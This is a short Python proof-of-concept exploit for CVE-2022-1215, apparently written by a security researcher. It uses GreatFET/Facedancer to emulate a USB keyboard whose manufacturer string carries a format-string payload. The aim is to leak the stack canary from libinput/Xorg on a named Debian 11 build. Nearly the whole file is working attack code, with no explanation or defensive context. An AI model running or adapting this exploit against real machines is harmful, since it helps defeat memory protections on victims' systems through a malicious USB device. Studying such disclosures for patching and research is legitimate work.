#!/usr/bin/env python3
# pylint: disable=unused-wildcard-import, wildcard-import
# /////// ++++++++++++ +++++++++++ +++++++++++ +++++++++++ ++++++++++ \\\\\\\\\\
#                               by: @hyprdude
#                             CVE: CVE-2022-1215
#       Stack canary leak via format string exploit using GreatFET/Facedancer
#    - OS: Debian 11 Stable XFCE, as of 2022-08-13
#    - xserver-xorg-core_1.20.11-1+deb11u1_amd64.deb built from Debian sources
#    - libinput10_1.16.4-3_amd64.deb built from Debian sources, dbg symbols enabled
# \\\\\\\ ++++++++++++ +++++++++++ ++++++++++++ +++++++++++ +++++++++ //////////
#
import sys
import os
import logging
import asyncio
from facedancer             import devices, main
from facedancer.devices.keyboard import USBKeyboardDevice

payload = "[[ CANARY: %39$p ]]"

print("[+] reading args from $FSERIAL, $FPRODUCT, and $FMANU env vars")
serial = os.environ.get("FSERIAL", "SERIAL")
product = os.environ.get("FPRODUCT", "PRODUCT")
manu = os.environ.get("FMANU", payload)

# create the device and connect
DEVICE = USBKeyboardDevice()
DEVICE.serial_number_string = serial
DEVICE.manufacturer_string = manu
DEVICE.product_string = product
DEVICE.product_id = 0x1337
DEVICE.vendor_id = 0x1337
main(DEVICE)

